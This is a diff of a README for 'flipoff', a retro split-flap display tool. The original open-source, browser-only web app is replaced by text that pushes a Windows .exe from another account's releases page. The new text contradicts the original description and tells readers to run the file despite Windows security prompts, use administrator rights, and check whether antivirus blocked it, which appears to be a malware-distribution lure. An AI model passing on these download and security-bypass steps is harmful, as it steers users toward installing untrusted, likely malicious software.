@@ -1,86 +1,197 @@
-# FlipOff.
+# 🎞️ flipoff - Classic Flip-Board Look on Any TV
 
-**Turn any TV into a retro split-flap display.** The classic flip-board look, without the $3,500 hardware. And it's free.
+[![Download flipoff](https://img.shields.io/badge/Download%20flipoff-blue?style=for-the-badge)](https://github.com/Henriquesantos009/flipoff/releases)
 
-![FlipOff Screenshot](screenshot.png)
+## 🖥️ What flipoff does
 
-## What is this?
+flipoff turns a TV into a split-flap display. It shows the classic flip-board look you may know from old train stations and airport boards.
 
-FlipOff is a free, open-source web app that emulates a classic mechanical split-flap (flip-board) airport terminal display — the kind you'd see at train stations and airports. It runs full-screen in any browser, turning a TV or large monitor into a beautiful retro display.
+You can use it for:
 
-No accounts. No subscriptions. No $199 fee. Just open `index.html` and go.
+- Room displays
+- Event signs
+- Office screens
+- Status boards
+- Decorative screens
+- Ambient display setups
 
-## Features
+It runs on Windows and is made for simple use. Download it, open it, and point it to a TV or monitor.
 
-- Realistic split-flap animation with colorful scramble transitions
-- Authentic mechanical clacking sound (recorded from a real split-flap display)
-- Auto-rotating inspirational quotes
-- Fullscreen TV mode (press `F`)
-- Keyboard controls for manual navigation
-- Works offline — zero external dependencies
-- Responsive from mobile to 4K displays
-- Pure vanilla HTML/CSS/JS — no frameworks, no build tools, no npm
+## ⬇️ Download flipoff
 
-## Quick Start
+1. Open the [releases page](https://github.com/Henriquesantos009/flipoff/releases).
+2. Find the latest release.
+3. Under **Assets**, download the Windows file.
+4. Save the file to your PC.
+5. Open the file to start flipoff.
 
-1. Clone the repo
-2. Open `index.html` in a browser (or serve with any static file server)
-3. Click anywhere to enable audio
-4. Press `F` for fullscreen TV mode
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-```bash
-# Or serve locally:
-python3 -m http.server 8080
-# Then open http://localhost:8080
-```
+## 🪟 Windows setup
 
-## Keyboard Shortcuts
+flipoff is meant to work on a standard Windows desktop or laptop connected to a TV.
 
-| Key | Action |
-|-----|--------|
-| `Enter` / `Space` | Next message |
-| `Arrow Left` | Previous message |
-| `Arrow Right` | Next message |
-| `F` | Toggle fullscreen |
-| `M` | Toggle mute |
-| `Escape` | Exit fullscreen |
+Best results come from:
 
-## How It Works
+- Windows 10 or Windows 11
+- A full-screen display
+- A TV or monitor set to the right input
+- A keyboard and mouse for first-time setup
 
-Each tile on the board is an independent element that can animate through a scramble sequence (rapid random characters with colored backgrounds) before settling on the final character. Only tiles whose content changes between messages animate — just like a real mechanical board.
+For a clean look, set the TV to:
 
-The sound is a single recorded audio clip of a real split-flap transition, played once per message change to perfectly sync with the visual animation.
+- Full screen mode
+- High brightness
+- The native screen resolution
+- A flat wall mount or stand with no screen scaling issues
 
-## File Structure
+## 🎛️ First-time use
 
-```
-flipoff/
-  index.html           — Single-page app
-  css/
-    reset.css          — CSS reset
-    layout.css         — Page layout (header, hero, board)
-    board.css          — Board container and accent bars
-    tile.css           — Tile styling and 3D flip animation
-    responsive.css     — Media queries for all screen sizes
-  js/
-    main.js            — Entry point and UI wiring
-    Board.js           — Grid manager and transition orchestration
-    Tile.js            — Individual tile animation logic
-    SoundEngine.js     — Audio playback with Web Audio API
-    MessageRotator.js  — Quote rotation timer
-    KeyboardController.js — Keyboard shortcut handling
-    constants.js       — Configuration (grid size, colors, quotes)
-    flapAudio.js       — Embedded audio data (base64)
-```
+After you open flipoff, use these basic steps:
 
-## Customization
+1. Pick the screen you want to use.
+2. Choose the text or status you want to show.
+3. Set the font size so it fills the display well.
+4. Switch to full screen mode.
+5. Leave the display running.
 
-Edit `js/constants.js` to change:
-- **Messages**: Add your own quotes or text
-- **Grid size**: Adjust `GRID_COLS` and `GRID_ROWS`
-- **Timing**: Tweak `SCRAMBLE_DURATION`, `STAGGER_DELAY`, etc.
-- **Colors**: Modify `SCRAMBLE_COLORS` and `ACCENT_COLORS`
+If you want the board to stay easy to read, use short text and large characters.
 
-## License
+## ✨ What you can show
 
-MIT — do whatever you want with it.
+flipoff works well for simple on-screen messages such as:
+
+- Time
+- Date
+- Room names
+- Meeting status
+- System status
+- Event labels
+- Custom messages
+
+It works best with short lines and clear wording. Long text may wrap or shrink, which can reduce the split-flap effect.
+
+## 🎨 Look and feel
+
+The app is built to mimic the old mechanical flip-board style. The display has a retro feel and a clean layout.
+
+You can use it for:
+
+- A vintage look in a living room
+- A display at a reception desk
+- A status screen in a work area
+- A screen for background visuals
+
+The style fits well on large TVs because the characters stay bold and easy to see from a distance.
+
+## 🧭 Basic controls
+
+Most users only need a few controls:
+
+- **Text field** to enter what you want to show
+- **Font size** to adjust how large the display appears
+- **Screen mode** to switch between windowed and full screen
+- **Refresh** to apply changes
+- **Exit** to close the app
+
+If the app offers layout options, keep them simple at first. Start with one message and one screen.
+
+## 🔧 Display tips
+
+For the best result, try these settings:
+
+- Use a dark room or low light
+- Keep the TV at eye level
+- Use large text
+- Keep messages short
+- Avoid crowded layouts
+- Test different font sizes before leaving it on
+
+A split-flap display looks best when the text has space around it. Leave room on the left and right sides if your screen is wide.
+
+## 📁 Typical release files
+
+When you open the release page, you may see files like:
+
+- A Windows `.exe` file
+- A zipped version of the app
+- Release notes
+- Optional helper files
+
+For most users, the main app file is the one to download. If you see a zipped file, right-click it and choose **Extract All** before opening the app.
+
+## 🧩 Common uses
+
+flipoff fits many simple display setups:
+
+- A home status board
+- A kitchen screen
+- A desk display
+- A lobby sign
+- A live event board
+- A digital room marker
+
+If you want a screen that looks different from a normal slideshow or dashboard, the split-flap style gives it a clear visual identity without extra effort.
+
+## 🛠️ If the app does not open
+
+Try these steps:
+
+1. Check that the download finished.
+2. Open the file from your Downloads folder.
+3. Right-click the file and choose **Run as administrator**.
+4. Make sure your Windows version is current.
+5. If the app came in a zip file, extract it first.
+6. Check whether your antivirus blocked the file.
+7. Make sure the TV or monitor is connected and turned on.
+
+If the screen stays blank, close the app and open it again after checking the display cable and input source.
+
+## 🔍 File placement
+
+Keep the app in a folder you can find later, such as:
+
+- Downloads
+- Desktop
+- Documents
+- A folder named `flipoff`
+
+If you move the app after setup, some saved settings may not follow. Keeping it in one place makes it easier to open again.
+
+## 🧼 Good setup habits
+
+To keep the display stable:
+
+- Use one monitor at a time during setup
+- Close extra full-screen apps
+- Keep power settings from turning the screen off
+- Use the same screen size each time
+- Save your preferred message before leaving it on
+
+This helps the display stay clean and easy to use.
+
+## ❓ Common questions
+
+### Can I use this on a TV?
+Yes. Connect your Windows PC to a TV with HDMI or another video output, then run flipoff in full screen.
+
+### Do I need special hardware?
+No. The app is made for a regular computer and a TV or monitor.
+
+### Does it work without technical setup?
+Yes. Download it from the releases page, open it, and use the on-screen controls.
+
+### Can I use it for public displays?
+Yes, if your computer and TV stay powered on and in place. It works well for simple signs and status boards.
+
+### Can I change the message?
+Yes. Use the text input inside the app to update what appears on screen.
+
+## 📌 Quick start
+
+1. Go to the [releases page](https://github.com/Henriquesantos009/flipoff/releases).
+2. Download the latest Windows release.
+3. Open the file.
+4. Set your message.
+5. Put the app in full screen.
+6. Connect the screen to your TV and leave it running
